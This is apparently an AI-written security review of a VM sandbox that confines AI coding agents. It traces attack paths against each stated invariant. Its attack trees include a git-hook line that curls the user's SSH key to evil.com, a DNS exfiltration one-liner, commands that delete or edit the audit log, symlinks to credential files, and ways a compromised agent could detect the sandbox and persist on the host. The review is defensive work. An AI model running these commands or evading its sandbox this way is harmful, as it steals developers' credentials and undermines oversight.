# Oracle Review: Security Architect (Opus)

**Reviewer:** Claude Opus 4.6 (Security Architect persona)
**Date:** February 8, 2026
**Documents Reviewed:** Sections 01–09, Competitive Landscape Research, prior reviews (Codex, Kimi)

---

## Executive Assessment

The architecture is well-reasoned and the threat model is more honest than most I see at this stage. The choice of libkrun, the network-layer secret injection model, and the decision to treat the guest as fully untrusted are correct. The planning documents show genuine security thinking, not security theater.

That said, I found **three findings I consider exploitable as designed**, **several invariant violations the current architecture cannot prevent**, and a systematic underestimation of the MITM proxy's role as both the crown jewel and the softest target in the system.

The other reviews covered scope/DX (Kimi) and operational skepticism (Codex) well. I won't rehash those. This review focuses on constructing actual attack paths and probing the invariants.

---

## Part 1: Invariant-by-Invariant Attack Analysis

### I-1: Agent cannot read host credentials

**Claimed mechanism:** VM filesystem boundary — host home dir not mounted.

**Status: HOLDS with caveats.**

The VM boundary is enforced by hardware virtualization. The only host filesystem visible to the guest is the virtio-fs mount at `/workspace`. This is sound. However:

**Finding 1: Symlink traversal via virtio-fs**
**Severity: High**
**Sections: 03, 04**

The planning documents never mention symlink handling on the virtio-fs mount. This is a well-known attack class against shared filesystem mounts.

Attack tree:
```
Agent creates symlink in /workspace
├─ ln -s /etc/passwd /workspace/.innocent-file
│  └─ If virtiofsd follows symlinks outside the shared root:
│     └─ Agent reads host /etc/passwd ← INVARIANT VIOLATION
├─ ln -s ~/.ssh/id_ed25519 /workspace/.key
│  └─ Same mechanism for SSH key exfiltration
└─ Existing symlinks in project directory that point outside CWD
   └─ node_modules/.package-lock.json → ~/... (unlikely but possible)
```

virtiofsd has a `--sandbox` option that controls whether symlinks can escape the shared directory. The options are `chroot` (default in some configs) and `namespace`. With `chroot`, the virtiofsd process is chroot'd into the shared directory, so symlinks outside it resolve to nothing. But:

1. The docs don't specify which virtiofsd sandbox mode to use
2. libkrun's virtio-fs implementation may differ from standalone virtiofsd
3. Pre-existing symlinks in the project directory that point to host paths outside the mount are the real risk — the agent doesn't need to create them, just find them

**Recommendation:** Specify and test symlink behavior explicitly. Configure virtiofsd in the most restrictive mode. Add adversarial tests: create a project directory containing symlinks to `~/.ssh/`, mount it via virtio-fs, verify the guest cannot follow them. Also test hardlinks, `.` and `..` traversal through the mount boundary.

---

**Finding 2: .git/hooks as persistence vector (violates I-1 indirectly and I-8 directly)**
**Severity: High**
**Sections: 01, 03, 04**

The project directory is mounted read-write. The agent can write to `.git/hooks/`. Git hooks execute on the HOST when the developer runs `git commit`, `git push`, `git checkout`, etc. AFTER the Redan session ends.

Attack tree:
```
Compromised agent writes to /workspace/.git/hooks/pre-commit
├─ Script: #!/bin/sh
│          curl https://evil.com/exfil -d "$(cat ~/.ssh/id_ed25519)"
├─ Agent session ends. VM destroyed.
└─ Developer runs 'git commit' on host
   └─ pre-commit hook executes AS THE DEVELOPER
      └─ Exfiltrates SSH key ← HOST CREDENTIAL STOLEN
```

This attack:
- Survives VM teardown (persistence)
- Executes with the developer's full identity
- Is invisible unless the developer inspects `.git/hooks/` manually
- Can't be prevented by network policy (hook runs on host, outside Redan)

The planning docs say "git provides the safety net for project files." Git hooks are project files. They're the safety net AND the attack surface.

**Recommendation:** This needs a concrete mitigation in v1:
1. Mount `.git/hooks/` as read-only (or don't mount it at all — create a synthetic `.git` in the VM without hooks)
2. OR: snapshot `.git/hooks/` before session, diff after session, warn if modified
3. OR: mount the entire project as read-only with a copy-on-write overlay (deferred to v2 in current plan, but this attack makes it v1-relevant)

Extend to other executable-on-host paths: `.github/workflows/`, `.vscode/tasks.json`, `Makefile`, `Justfile`, `.husky/`, `Taskfile.yml`, `package.json` scripts, `pyproject.toml` scripts. Any file that the developer's toolchain executes outside of Redan.

---

### I-2: Agent cannot reach unauthorized hosts

**Claimed mechanism:** VM-level network enforcement via virtual NIC.

**Status: HOLDS for hostname-based connections. BREAKS for direct IP connections.**

**Finding 3: IP-based policy bypass**
**Severity: High**
**Sections: 02, 03, 04**

Network policy is hostname-based (Section 3.3): `allow = ["api.github.com"]`. DNS resolution happens on the host. But what prevents the guest from connecting directly to an IP address?

Attack tree:
```
Agent resolves api.github.com → 140.82.121.6 (via allowed DNS)
Agent then connects directly to 140.82.121.6:443
├─ TSI mode: guest calls connect("140.82.121.6", 443)
│  ├─ Host proxy sees TCP connection to IP 140.82.121.6
│  │  └─ How does the proxy check this against hostname allowlist?
│  │     ├─ Reverse DNS lookup → unreliable, attacker-controllable
│  │     ├─ Forward-confirmed reverse DNS → still fragile
│  │     └─ No hostname → policy cannot match → ???
│  └─ If default-deny applies to IP connections: SAFE (connection blocked)
│     If not: BYPASS ← policy violated
├─ More concerning: agent connects to DIFFERENT IP:
│  └─ connect("93.184.216.34", 443)  ← evil.com's IP
│     └─ Proxy has no hostname to check
│        └─ If default-deny for IPs: SAFE
│        └─ If any IP-based passthrough: BYPASS
```

The docs don't specify how raw IP connections are handled. The default-deny semantics say "only listed hosts are reachable" but "hosts" implies hostnames. What happens when the guest uses an IP?

With TSI specifically: TSI intercepts at the socket level. If the guest calls `connect()` with a string hostname, TSI resolves it on the host. If the guest calls `connect()` with a `sockaddr_in` containing a raw IP, TSI still routes through the host — but the proxy only sees an IP, not a hostname.

**Recommendation:** Explicit policy: all connections to raw IP addresses are BLOCKED by default. No reverse-DNS games. If the guest connects by IP, the connection is dropped. The allowlist only matches hostnames resolved through the host's DNS path. Document this. Test it.

---

**Finding 4: Domain fronting via allowed hosts**
**Severity: Medium**
**Sections: 04**

With MITM, the proxy terminates TLS and sees HTTP headers. But the enforcement point is the TCP-level destination (good) combined with the HTTP-level Host/`:authority` header (not discussed).

Attack tree:
```
api.github.com is allowlisted
Agent connects to api.github.com:443 (allowed at TCP level)
TLS terminated by proxy, which sees HTTP request:
  GET / HTTP/1.1
  Host: evil.com    ← different from TCP destination

├─ If proxy checks ONLY TCP destination: secret injected, request forwarded
│  └─ CDN serving api.github.com MAY route based on Host header
│     └─ Request reaches evil.com's backend ← EXFILTRATION WITH REAL SECRET
├─ If proxy checks Host header MATCHES TCP destination: SAFE
│  └─ Mismatch detected, request blocked
```

This is domain fronting. It's less of a concern since GitHub doesn't share CDN infrastructure with arbitrary domains the way Cloudflare/AWS CloudFront do. But it's a category of attack that needs consideration.

More practically: GitHub, npm, and cloud APIs may have multiple valid hostnames (e.g., `api.github.com` vs `github.com` vs `raw.githubusercontent.com` vs `objects.githubusercontent.com`). If only `api.github.com` is allowlisted, the agent might receive a redirect to `raw.githubusercontent.com` (not allowlisted), fail, and the developer adds `*.github.com` to the allowlist. Wildcard allowlists increase the fronting risk.

**Recommendation:** The proxy MUST verify that the HTTP Host/`:authority` header matches the TCP-level destination hostname (or is a valid alias). Log mismatches as suspicious. Block by default.

---

### I-3: Real secrets never visible inside VM

**Claimed mechanism:** Host-side network-layer injection.

**Status: VIOLATED by design in env injection mode. VIOLATED via response reflection in header injection mode.**

**Finding 5: Response reflection breaks I-3 for header injection**
**Severity: High**
**Sections: 04, 04a**

The Codex review flagged this. Let me make it concrete with an attack tree.

Attack tree:
```
GITHUB_TOKEN configured with inject_for = ["api.github.com"]
Prompt-injected agent:

1. Construct request that causes api.github.com to echo the token:
   ├─ GitHub API doesn't echo auth headers in normal responses
   ├─ But: create a Gist with content = "placeholder", then:
   │   POST /gists → creates gist (real token injected by proxy)
   │   GET /gists/{id} → returns gist content
   │   └─ No, the content was the placeholder string, not the token
   ├─ GitHub webhook configuration:
   │   POST /repos/{owner}/{repo}/hooks
   │   body: { "config": { "url": "...", "secret": "$GITHUB_TOKEN" } }
   │   └─ The $GITHUB_TOKEN is the PLACEHOLDER. Proxy only injects into
   │        the Authorization header, not the body. So this sends
   │        the placeholder as the webhook secret. ← SAFE
   └─ If the agent finds an API that echoes Authorization header:
      ├─ X-RateLimit response headers sometimes include auth info → no
      ├─ /meta, /rate_limit endpoints → don't echo tokens
      └─ GitHub doesn't echo auth. But other APIs might.

2. For APIs that DO echo tokens (Slack, some enterprise APIs):
   ├─ GET https://slack.com/api/auth.test
   │   Response: {"user": "...", "token": "xoxb-real-token"}
   │   └─ Real token in response body, visible to agent ← I-3 VIOLATED
   ├─ Agent now has real token in VM memory
   ├─ Can't exfiltrate to evil.com (network policy)
   ├─ BUT can write it to /workspace/innocent-file.txt
   │   └─ Persists on host via virtio-fs ← SECRET ON HOST DISK
   └─ OR can embed it in a commit message
      └─ Persists in git history ← SECRET IN VCS
```

The planning says "acceptable because they can't be exfiltrated." This is too narrow. The secret doesn't need to leave the developer's machine via network to be compromised — it can be persisted to disk or repository.

**Recommendation:** Two mitigations:
1. Implement response scrubbing for v1 — at minimum, scan response headers for exact matches of injected secret values and replace with the placeholder. Body scanning is expensive but header scanning is cheap.
2. Document the residual risk clearly: "If an authorized API echoes your secret in a response body, that value will be visible in the VM session and may be written to project files."

---

**Finding 6: env injection mode is not "weaker" — it's a complete invariant violation**
**Severity: High**
**Sections: 04a**

`inject_mode = "env"` passes the real secret value into the VM via `krun_set_env()`. The docs call this "explicitly weaker." It's not weaker. It completely nullifies invariants I-3 and partially nullifies I-4.

With `inject_mode = "env"`:
- `echo $DATABASE_URL` inside the VM prints the real connection string with real password
- `env` or `cat /proc/self/environ` shows all real secrets
- A compromised agent can read all env-injected secrets and attempt exfiltration
- Network policy still blocks exfiltration to unauthorized hosts — so I-2 holds
- But: the secret can be written to /workspace/ files, embedded in commits, printed to terminal

The docs present this as a footnote. It should be a first-class architectural concern because database connections, gRPC with mTLS, SSH, and many other protocols require this mode. For many real enterprise deployments, most secrets will be env-injected, not header-injected.

**Recommendation:**
1. Treat `inject_mode = "env"` as a separate security tier with its own threat model
2. Consider alternatives: for database connections, could Redan run a local proxy that the guest connects to, with the proxy adding authentication? (Like pgbouncer for Postgres, or a SOCKS proxy with auth injection)
3. At minimum: make env-injected secrets visually distinct in audit logs and policy files. Force the user to acknowledge the weaker guarantee when configuring.

---

### I-4: Secrets only injected for authorized hosts

**Claimed mechanism:** Per-secret host allowlist enforced at injection point.

**Status: HOLDS at the proxy level, but see I-3 violations for indirect access.**

The proxy's injection logic is sound in principle: check destination against `inject_for`, inject only if matched. The concern is at the edges.

**Finding 7: HTTP request smuggling through the MITM proxy**
**Severity: Medium**
**Sections: 04, 04a**

The MITM proxy terminates TLS and parses HTTP. HTTP request smuggling (CL/TE desync, H2-to-H1 downgrade) is a well-documented attack class against proxies. If the proxy's HTTP parser disagrees with the destination server about request boundaries, the agent can craft requests where:
- The proxy thinks it's one request (and injects the secret)
- The destination server sees two requests, the second of which may be to a different backend/path

This is standard for any proxy architecture. The defense is using a well-tested HTTP implementation (hyper in Rust is solid) and not implementing custom HTTP parsing.

**Recommendation:** Use `hyper` for all HTTP parsing. Don't roll custom parsers. Run the OWASP HTTP request smuggling test suite against the proxy during development. Add it to CI.

---

### I-5: Agent identity is separate from developer identity

**Claimed mechanism:** Scoped credentials from secret management backend.

**Status: FALSE for MVP. Only true with enterprise backends.**

With `source = "env"`, the agent uses the developer's GITHUB_TOKEN. There's no separate identity. The token has the developer's permissions, not agent-specific scoped permissions.

This invariant only holds when:
- Vault issues a scoped token for the agent role
- AWS STS assumes a role with agent-specific permissions
- The organization has set up per-agent identity policies

None of this is in MVP. The invariant should be marked as "v1.0+ only" and the MVP security story should not claim agent identity separation.

**Recommendation:** Be honest in MVP messaging. The MVP provides network isolation and secret hiding, not identity separation. Identity separation is a v1.0 feature requiring enterprise backend setup.

---

### I-6: All policy decisions are auditable

**Claimed mechanism:** Structured JSONL logging.

**Finding 8: Audit log tamperable by the agent**
**Severity: High**
**Sections: 03, 04a**

The audit log is written to `.redan/audit.jsonl` relative to the project root (Section 3.3). The project root is mounted read-write at `/workspace`. Therefore, the agent can:

```
rm /workspace/.redan/audit.jsonl                    # delete the log
echo '{}' > /workspace/.redan/audit.jsonl           # overwrite with garbage
truncate -s 0 /workspace/.redan/audit.jsonl         # clear it
# Or more subtly:
sed -i '/evil.com/d' /workspace/.redan/audit.jsonl  # remove specific entries
```

A compromised agent can tamper with its own audit trail.

**Recommendation:** Write the audit log to a path OUTSIDE the virtio-fs mount. `$XDG_STATE_HOME/redan/sessions/<session_id>/audit.jsonl` on the host. The agent has no access to host filesystem outside `/workspace`. This is a straightforward fix.

If the `.redan/` directory in the project root is needed for convenience, write a copy there but treat the host-side log as canonical. Or better: write directly to host-side only and provide `redan audit show` to view it.

---

### I-7: Project file changes are controlled

**Claimed mechanism:** "Write-back channel from VM to host with optional review."

**Status: CONTRADICTED by architecture.**

Section 3.5 says virtio-fs provides "real-time bidirectional access. Changes made by the agent are immediately visible on the host." This is the opposite of a "controlled write-back channel." The agent writes; the host sees it instantly. No review, no approval.

The invariant table in Section 1.4 says "write-back channel from VM to host with optional review." Section 3.5 says real-time virtio-fs. These contradict each other.

**Recommendation:** Restate I-7 to match reality: "Project file changes are visible to the developer in real-time via the shared filesystem. Git provides the review mechanism for accepting or reverting changes." Remove the "controlled write-back" language — it implies approval that doesn't exist.

---

### I-8: No persistent host modification

**Claimed mechanism:** "Agent writes go to VM filesystem; project sync is explicit."

**Status: FALSE. virtio-fs writes persist immediately to host.**

Same contradiction as I-7. Additionally, Finding 2 (.git/hooks persistence) demonstrates that the agent can achieve persistent code execution on the host through project file writes.

The docs acknowledge this in Section 1.4 (Key Decision 3): "v1 protects credentials and network. Project directory is read-write." But the invariant table claims "no persistent host modification."

**Recommendation:** Remove I-8 or restate it as: "Agent cannot modify host files outside the project directory." This is the actual guarantee. Document the residual risk: files within the project directory (including git hooks, CI configs, Makefiles) are modifiable by the agent and will persist.

---

## Part 2: MITM Proxy Deep Analysis

The MITM proxy is the load-bearing wall of the security architecture. Every secret injection flows through it. Every network policy decision happens there. It's also the component most exposed to untrusted input from the guest.

**Finding 9: The proxy is the highest-value target for guest-side attacks**
**Severity: High**
**Sections: 02, 04**

The proxy:
- Receives raw TCP connections from the guest (untrusted input)
- Parses TLS ClientHello (untrusted)
- Generates certificates (cryptographic operations driven by untrusted SNI)
- Parses HTTP requests (untrusted)
- Holds all real secret values in memory
- Makes outbound connections to real services

A memory corruption bug in the TLS parsing or HTTP parsing code could allow the guest to read host process memory — where the real secrets live. Rust mitigates this significantly, but:
- `unsafe` blocks in dependencies (rustls, hyper, rcgen) are attack surface
- Logic bugs in HTTP parsing (request smuggling, header injection) don't require memory corruption
- Denial of service against the proxy (slowloris, large headers, connection flooding) could degrade the developer experience enough to disable Redan

**Recommendation:**
1. Minimize `unsafe` in the proxy code itself. Audit dependencies for `unsafe` usage.
2. Consider running the proxy in a separate process with reduced privileges (not holding secrets directly — communicate with the secret manager via IPC). This limits blast radius if the proxy is compromised.
3. Implement resource limits on guest connections: max concurrent connections, max header size, request timeout, connection timeout.
4. Fuzz the proxy with arbitrary TCP input during development. Use `cargo-fuzz` or AFL.

---

**Finding 10: Certificate Transparency implications**
**Severity: Low**
**Sections: 04**

The MITM proxy generates certificates signed by an ephemeral CA. These certificates won't appear in CT logs (they're never submitted to CT log servers). This means:
- Chrome and other browsers with CT enforcement would reject these certs — but there's no browser in the VM, so irrelevant
- Tools that check for CT SCTs (Signed Certificate Timestamps) would fail — rare in CLI tools
- The ephemeral CA won't trigger any external CT monitoring — no information leak

This is fine. Including it for completeness since the review prompt asked.

**Recommendation:** No action. Document that CT is not relevant for VM-internal certificates.

---

**Finding 11: MITM proxy handling of modern HTTP**
**Severity: Medium**
**Sections: 04**

The docs mention HTTP/1.1, HTTP/2, and WebSocket. Missing from analysis:

| Feature | Impact on Proxy |
|---------|----------------|
| HTTP/2 server push | Server can push resources for URLs the agent didn't request. Pushed resources bypass the per-request secret injection logic (no request headers to scan for placeholders). Low risk — server push is from allowed hosts. |
| 103 Early Hints | Response status before the real response. Proxy must handle correctly or lose headers. |
| HTTP/2 CONNECT (RFC 8441) | Extended CONNECT for WebSocket over H2. The proxy must handle this or agents using H2 WebSocket connections break. |
| Transfer-Encoding: chunked + trailers | Secret could theoretically be in HTTP trailers. Proxy must scan trailers too. |
| HTTP/2 CONTINUATION frames | Headers split across CONTINUATION frames. The proxy must reassemble before scanning for placeholders. Incomplete reassembly = missed injection OR missed policy check. |
| Content-Encoding | Compressed request bodies. If the placeholder is in a compressed body, the proxy can't find it without decompression. But placeholders should be in headers, not bodies. Verify this assumption holds. |

**Recommendation:** Use hyper for HTTP handling (handles H2 framing, CONTINUATION, etc. correctly). Don't attempt to hand-parse HTTP/2 frames. Add protocol-specific tests for each of these cases in the adversarial test suite.

---

**Finding 12: Placeholder token predictability**
**Severity: Low (if implemented correctly)**
**Sections: 04a**

Placeholders are described as "random, e.g., redan_ph_<32 hex chars>" — 128 bits of entropy. If generated from a CSPRNG, this is not brute-forceable. But the docs don't specify the randomness source.

Risks if predictable:
- Agent predicts placeholder for a secret it doesn't have access to → injects it into a request → proxy replaces with real value → agent gets access to unauthorized secret
- But: the proxy maps specific placeholders to specific secrets. A random string that doesn't match any registered placeholder is left unchanged. The agent can't forge a placeholder for a secret it doesn't know the placeholder for.

Wait — the agent DOES know all placeholders. They're in the environment: `$GITHUB_TOKEN = redan_ph_a1b2c3d4...`. The agent can read all of them. The question is whether knowing the placeholder for SECRET_A helps predict the placeholder for SECRET_B.

If placeholders are generated independently from CSPRNG, knowing one reveals nothing about others. If they're sequential from a seeded PRNG, knowing one might predict others.

**Recommendation:** Use `getrandom` / CSPRNG for placeholder generation. Document this. Don't use sequential counters or seeded PRNGs.

---

## Part 3: The Bootstrap Problem (Serious Treatment)

Section 4a.4 acknowledges this but concludes "the host must have SOME credential." This deserves more analysis.

**Finding 13: Enterprise bootstrap is underspecified and is the adoption blocker**
**Severity: High**
**Sections: 04a, 05**

The bootstrap problem isn't just "recursive credentials." It's the reason enterprise security teams will reject or fail to deploy Redan.

**The real enterprise authentication flow:**

```
Developer laptop
├─ Has: Corporate SSO session (Okta, Azure AD, etc.)
├─ Developer runs: vault login -method=oidc
│  ├─ Opens browser → corporate SSO → OIDC flow
│  ├─ Receives Vault token (TTL: 8h, policies: team-specific)
│  └─ Token stored in ~/.vault-token (on host filesystem!)
├─ Developer runs: redan exec -- claude
│  ├─ Redan reads ~/.vault-token ← the developer's broad token
│  ├─ Redan calls Vault with this token to read agent secrets
│  └─ Question: does Redan use the developer's token directly,
│     or does it exchange for a scoped agent token first?
│
├─ Option A: Direct use of developer's Vault token
│  ├─ Simple. Works immediately.
│  ├─ But: Redan has the developer's full Vault permissions
│  ├─ If Redan is compromised: all Vault paths accessible
│  └─ Doesn't achieve "agent identity separate from developer"
│
├─ Option B: Token exchange for scoped agent token
│  ├─ Redan authenticates to Vault as "redan-agent-for-<project>"
│  ├─ Requires Vault AppRole/entity setup per project
│  ├─ Requires security team to create and manage Vault policies
│  ├─ Requires mapping: developer identity → allowed agent roles
│  └─ This is significant organizational work BEFORE Redan is useful
│
└─ Option C: Wrapped secret delivery
   ├─ Security team provisions a wrapped token per developer
   ├─ Developer runs redan with the wrapping token
   ├─ Redan unwraps it once (single-use) to get the agent token
   └─ Most secure, but requires an enrollment flow
```

The plan doesn't specify which option to implement. Option A is easiest but undercuts I-5. Option B is correct but requires organizational prerequisites that may take months. Option C is ideal but needs enrollment infrastructure.

**Recommendation:** Specify the authentication flow in detail:
1. MVP: Option A (direct use of developer's credentials via `env` backend). Be honest that I-5 doesn't hold.
2. v1.0: Option B with documentation for Vault policy setup. Provide Terraform/Pulumi modules for common Vault configurations.
3. v1.1: Option C via integration with corporate identity providers.

Also address the `~/.vault-token` problem: if Redan reads Vault tokens from the host filesystem, and the goal is to not store secrets on disk... the bootstrap credential is on disk. This is inherent and should be documented, not hidden.

---

**Finding 14: AWS credential chain complexity**
**Severity: Medium**
**Sections: 04a**

The plan says "uses standard AWS credential chain." The AWS credential chain checks (in order):
1. Environment variables (`AWS_ACCESS_KEY_ID`, etc.)
2. Shared credentials file (`~/.aws/credentials`)
3. AWS config file (`~/.aws/config`)
4. Container credential provider (ECS)
5. Instance metadata (EC2 IMDSv2)
6. SSO cache (`~/.aws/sso/cache/`)

For a developer laptop:
- Options 1–3 involve long-lived credentials on disk or in environment
- Option 6 (SSO) is the modern approach: `aws sso login` → cached session token

If Redan reads `~/.aws/credentials` or SSO cache from the host, it has the developer's AWS identity. The `assume_role` configuration in `redan.toml` scopes this down... but the initial credential still has the developer's permissions.

**Recommendation:** Document explicitly which credential sources Redan will read and the security implications of each. Recommend SSO + assume_role as the best-practice flow. Consider short-circuiting the credential chain: only support explicit credential specification or SSO, not the full fallback chain (which might accidentally use overprivileged credentials).

---

## Part 4: Network Policy Completeness

**Finding 15: Missing protocol-level blocks**
**Severity: Medium**
**Sections: 02, 04**

The docs cover HTTP, DNS, SSH, WebSocket, gRPC, raw TCP, and UDP. Missing:

| Protocol/Vector | Status | Risk |
|----------------|--------|------|
| ICMP (ping) | Not mentioned | Low — data exfiltration via ICMP payload is possible but slow. Block it. |
| IPv6 link-local (fe80::/10) | Not mentioned | Medium — could reach host services if IPv6 is enabled in VM. |
| Multicast (224.0.0.0/4) | Not mentioned | Low — mDNS/LLMNR could leak VM presence to local network. |
| SCTP | Not mentioned | Low — rarely used but could bypass TCP/UDP policies. |
| IP-in-IP / GRE tunneling | Not mentioned | Low — requires raw sockets, unlikely in standard agent use. |
| Connection reuse across policy changes | Not mentioned | Medium — see below. |

**Connection keep-alive across policy changes:**
If the developer modifies `redan.toml` mid-session (hot reload), existing keep-alive connections to a host that was just removed from the allowlist will persist. The proxy must track active connections and terminate those that no longer match policy.

**Recommendation:** Default to blocking everything except TCP and DNS. Explicitly disable ICMP, IPv6 link-local, multicast. Document connection lifecycle management for policy changes.

---

**Finding 16: DNS as a covert channel (residual risk)**
**Severity: Low**
**Sections: 02, 04**

DNS queries from the VM are resolved on the host. The docs correctly note that DNS exfiltration of the placeholder is meaningless. But:

DNS can still be used as a covert channel for exfiltrating PROJECT data (source code, not secrets). A compromised agent could encode project files into DNS queries:

```
dig $(head -c 60 /workspace/src/main.rs | base64).attacker.com
```

The host DNS resolver will forward this query. The attacker receives the base64-encoded source code in their DNS logs.

Mitigation: the DNS query goes to the host's resolver, not directly to the internet. If the host uses a corporate DNS that logs queries, this is detectable. But it's not blocked.

**Recommendation:** For v1, document this as a known residual risk. For v1.1, consider DNS query logging and anomaly detection (query length, entropy). For enterprise, recommend using a DNS resolver that blocks high-entropy queries (e.g., Pi-hole, corporate DNS with security filtering).

---

## Part 5: VM Escape — Honest Assessment

**Finding 17: "Same trust boundary as AWS Lambda" is misleading**
**Severity: Medium (documentation, not technical)**
**Sections: 04, 08**

Section 4.2 claims Redan's VM boundary is comparable to AWS Lambda's Firecracker isolation. This overstates the case.

| Factor | AWS Lambda / Firecracker | Redan / libkrun |
|--------|--------------------------|------------------|
| VMM | Firecracker (minimized, purpose-built) | libkrun (broader scope, multiple use cases) |
| Kernel | Custom-patched Linux kernel | Whatever the OCI image provides |
| Host hardening | Dedicated hardware, seccomp, cgroups, custom init | Developer laptop, standard OS, no additional hardening |
| Security audits | Extensive third-party audits, bug bounty | Community review, no formal audit |
| Attack surface reduction | Minimal virtio device set, no USB, no PCI passthrough | libkrun has broader device support |
| Multi-tenant isolation | Yes (between customers) | No (single user) |
| Monitoring | CloudWatch, GuardDuty, automated anomaly detection | Local JSONL logs |

libkrun uses components from Firecracker (via rust-vmm crates), but it's a different project with different constraints. The security of libkrun is likely reasonable — it's used by Podman and crun, and it's maintained by Red Hat. But claiming equivalence with AWS Lambda's isolation stack is architecturally inaccurate.

**Recommendation:** Restate the comparison honestly: "Redan uses hardware virtualization (KVM/HVF) which is the same isolation *class* as AWS Lambda and Google gVisor. The specific VMM (libkrun) has not undergone the same level of security auditing as Firecracker. We trust the hardware virtualization boundary (hypervisor-enforced memory isolation) rather than claiming equivalence with any specific production deployment."

---

**Finding 18: Guest kernel attack surface against VMM**
**Severity: Medium**
**Sections: 04**

The guest runs a full Linux kernel (from the OCI image). This kernel interacts with libkrun via virtio devices. Malicious guest code can:
- Send crafted virtio requests (virtio-net, virtio-fs, virtio-vsock)
- Attempt to exploit bugs in the host-side virtio device implementations
- The virtio device implementations in libkrun (inherited from rust-vmm) are the actual attack surface

This is inherent to any VMM architecture. The mitigation is that rust-vmm's virtio implementations are in Rust (memory-safe). But logic bugs, integer overflows in `unsafe` blocks, and incorrect device emulation could still be exploitable.

**Recommendation:** This is already listed as out-of-scope (VM escape via hypervisor). Fair enough — it's the same risk every cloud provider accepts. But document the specific attack surface: "The guest interacts with the host through virtio-net, virtio-fs, and virtio-vsock devices. Bugs in the host-side device emulation (rust-vmm crates) could theoretically allow guest-to-host escape." Track security advisories for rust-vmm and libkrun.

---

## Part 6: Attacks the Other Reviews Missed

**Finding 19: OCI image supply chain — the guest root of trust**
**Severity: High**
**Sections: 02, 05**

The planning says "Stock OCI images for v1. No custom base images." This means the entire guest OS comes from a public registry. If the image is compromised (registry account takeover, dependency confusion, typosquatting), the agent runs in a malicious environment from the start.

A compromised OCI image could:
- Include a modified CA trust store that trusts attacker certificates
- Include a modified `curl` that sends data to a sideband channel
- Modify the shell to log all input/output
- Install a network tunnel that communicates through allowed hosts

Redan's network policy would limit the blast radius (the compromised image can only reach allowed hosts), but the agent's behavior inside the VM would be invisible to Redan.

**Recommendation:**
1. For v1: document that OCI image integrity is the user's responsibility. Recommend using image digests (`python:3.12@sha256:...`) not tags.
2. For v1.1: implement image signature verification (cosign/sigstore). Warn when running unverified images.
3. Consider providing official `redan/base` images with known provenance as an alternative to stock images.

---

**Finding 20: Timing side-channel for secret existence detection**
**Severity: Low**
**Sections: 04a**

A compromised agent can determine which secrets are configured (beyond reading env var names) by measuring request latency:

```
# Time a request to api.github.com (secret configured → injection occurs)
time curl -s -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/ > /dev/null

# Time a request to api.github.com (no auth header → no injection)
time curl -s https://api.github.com/ > /dev/null

# Latency difference reveals whether injection occurred
```

This is informational — the agent already knows which env vars exist. But it could detect the difference between "this secret is configured but backend retrieval failed" and "this secret was injected."

**Recommendation:** No action needed for v1. Document as known information leak. The practical impact is negligible since env var names already reveal which secrets exist.

---

**Finding 21: Secret leakage via git operations**
**Severity: Medium**
**Sections: 04, 06**

If an agent uses `git push` through the Redan proxy, and the git remote is an allowed host (e.g., github.com), the proxy injects the GITHUB_TOKEN for authentication. The push succeeds.

But consider: the agent creates a commit that contains the response from an API call that echoed the real secret (Finding 5). The agent then pushes this commit.

```
Compromised agent:
1. curl api.slack.com/auth.test → response contains real token
2. echo "debug: $response" > /workspace/debug.txt
3. git add debug.txt && git commit -m "debug" && git push
```

The push succeeds (github.com is allowed, git auth injected). The real Slack token is now in the git repository. Anyone with repo access can see it.

This combines Finding 5 (response reflection) with the read-write project mount. The network policy doesn't help because the data exits through an allowed channel (git push to an authorized remote).

**Recommendation:** This is the "allowed-host exfiltration" problem in its most dangerous form. Possible mitigations:
1. Scan outbound git push content for known secret patterns (expensive, fragile, cat-and-mouse)
2. Make git push a separately-audited operation with its own approval step
3. Accept the risk and document it: "Redan prevents direct credential theft. It cannot prevent a compromised agent from writing data to the project that is subsequently pushed to a remote."

Honestly: option 3. The git push problem is real but fundamentally hard to solve without making the system unusable.

---

**Finding 22: Agent detection of Redan environment**
**Severity: Low**
**Sections: 06**

A prompt-injected agent could detect it's inside Redan and alter behavior accordingly (appear benign in Redan, malicious outside):

Detection signals:
- Environment variables with `redan_ph_` prefix
- `/workspace` mount point
- VM kernel version/hardware (QEMU/KVM identifiers in `/proc/cpuinfo`, DMI data)
- Presence of ephemeral CA cert in trust store
- Network latency patterns (proxy overhead)
- Missing `~/.ssh`, `~/.aws` directories

**Recommendation:** Low priority. This is inherent to any sandbox — the guest can always detect it's sandboxed. The important thing is that detection doesn't help the attacker bypass the sandbox.

---

## Part 7: Risk Register Additions

The following risks should be added to Section 8:

| ID | Risk | Likelihood | Impact | Rating |
|----|------|-----------|--------|--------|
| R13 | Symlink traversal via virtio-fs mount escapes project boundary (Finding 1) | Medium | High | 🟠 High |
| R14 | Git hooks modified by agent persist and execute on host (Finding 2) | High | High | 🔴 Critical |
| R15 | Audit log stored in agent-writable directory (Finding 8) | High | Medium | 🟠 High |
| R16 | OCI image supply chain compromise (Finding 19) | Medium | High | 🟠 High |
| R17 | Direct IP connections bypass hostname-based policy (Finding 3) | Medium | High | 🟠 High |
| R18 | Response reflection exposes secrets to VM memory/project files (Finding 5) | Medium | Medium | 🟡 Medium |

R14 is the only finding I'd call **critical** — it's a concrete, practical persistence attack that works as designed with no implementation bugs required. An attacker-controlled agent writes a git hook, the developer commits, and the hook exfiltrates credentials on the host outside any Redan protection.

---

## Part 8: Summary of Recommendations

### Must-fix for v1 (architectural changes needed)

1. **Audit log location:** Move out of project directory to host-only path. (Finding 8)
2. **.git/hooks protection:** Mount `.git/hooks/` read-only, or snapshot+diff, or exclude from mount. Extend to other executable paths. (Finding 2)
3. **Raw IP blocking:** Explicitly block all connections to IP addresses (not hostnames). (Finding 3)
4. **Symlink policy:** Specify and test virtio-fs symlink handling. Ensure no traversal outside shared root. (Finding 1)
5. **Restate invariants I-7 and I-8** to match actual architecture. (Findings on I-7, I-8)

### Should-fix for v1 (implementation guidance)

6. **Host header validation:** Proxy must verify HTTP Host matches TCP destination. (Finding 4)
7. **Response header scrubbing:** Scan response headers for injected secret values, replace with placeholder. (Finding 5)
8. **Proxy hardening:** Max connection limits, header size limits, request timeouts, fuzzing. (Finding 9)
9. **HTTP/2 CONTINUATION handling:** Ensure full header reassembly before placeholder scanning. (Finding 11)
10. **env injection mode documentation:** Explicit security tier, separate threat model, acknowledgment in config. (Finding 6)

### Document/acknowledge for v1

11. **VM escape comparison:** Don't claim Lambda equivalence. Describe actual trust basis. (Finding 17)
